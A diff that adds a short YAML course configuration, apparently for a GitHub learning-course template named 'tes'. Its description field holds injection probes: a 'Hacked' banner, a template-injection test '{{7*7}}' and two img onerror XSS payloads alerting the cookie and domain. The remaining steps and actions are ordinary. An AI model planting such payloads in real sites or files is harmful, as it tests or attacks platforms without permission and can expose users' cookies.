@@ -1,0 +1,19 @@
+title: tes
+description: >-
+  Hacked<br><br><center><font color="red">{{7*7}}<br><br><img src=x
+  onerror=alert(document.cookie)><br><br><img src=x
+  onerror=alert(document.domain)>
+template:
+  repo: tes-template
+  name: tes
+before:
+  - type: createIssue
+    title: Welcome!
+    body: new-issue.md
+steps:
+  - title: First step
+    description: The first step in your course
+    event: issues.assigned
+    link: '{{ repoUrl }}'
+    actions:
+      - type: closeIssue
